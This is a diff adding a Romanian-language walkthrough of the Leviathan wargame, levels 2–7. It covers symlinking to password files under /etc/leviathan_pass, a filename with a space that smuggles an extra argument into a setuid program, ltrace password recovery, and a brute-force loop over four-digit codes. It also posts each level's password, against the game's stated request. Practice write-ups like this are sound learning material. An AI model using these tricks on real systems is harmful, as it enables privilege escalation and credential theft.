@@ -24,4 +24,83 @@ aflam parola leviathan2 cu cat /etc/leviathan_pass/leviathan2
 R:mEh5PNl10e
 
 Level2:
+Se executa scriptul din home directory si se observa ca acesta nu are acces la fisierul de parola.
+Mai mult de atat cand ii este dat un argument de tip "nume1 nume2", executa separat pentru fiecare din cele doua.
+Astfel creem un director:
+mkdir /tmp/dir2
+ln -s /etc/leviathan_pass/leviathan3 fisier (creem un shortcut catre fisierul de parole care sa poata fi executat)
+touch fisier\ file.txt (creem fisierul cu numele "fisier file.txt" pentru a 'pacali' shell ul)
+cd
+./printfile /tmp/dir2/"fisier file.txt" care conduce la aflarea parolei
+
+
+R:Q0G8j4sakn
+
+Level3:
+ltrace ./level3 - observam ca parola este snlprintf
+Se introduce parola snlprintf
+Apare o instanta shell.
+whoami -> leviathan4
+cat /etc/leviathan_pass/leviathan4
+
+R:AgvropI4OA
+
+Level4:
+ls -a
+Se gasesti directorul .trash
+cd ./.trash
+./bin -> se obtine un output binar
+Se foloseste comanda gasita pe stackoverflow pentru a face conversie de la binar la ascii
+./bin |perl -lape '$_=pack"(B8)*",@F'
+
+R:EKKlTF1Xqs
+
+Level5:
+ls
+./leviathan5
+ltrace ./leviathan5
+Fisierul /tmp/file.log nu exista.
+Scriptul consta in afisarea lui.
+Solutia este sa creem un softlink catre fisierul cu parola necesara.
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+./leviathan5 -> parola dorita
+R:YZ55XPVk2l
+
+Level6:
+./leviathan6
+-trebuie sa aiba ca argument un cod de 4 cifre.Nu avem de unde sa aflam deci facem un force brute
+cd /tmp
+mkdir dirlv6
+cd dirlv6
+touch script
+chmod u+x script
+vim script
+
+#!/bin/bash
+cd
+for i in {0000..9999}
+do
+	./leviathan6 $i
+done
+
+./script
+Dupa ce gaseste numarul, intra intr o instanta shell
+whoami -> leviathan7
+cat /etc/leviathan_pass/leviathan7
+
+R:8GpZ5f8Hze
+
+Level7:
+ls
+cat CONGRATULATIONS
+Well Done, you seem to have used a *nix system before, now try something more serious.
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
+
+
+
+
+
+
+
+
 
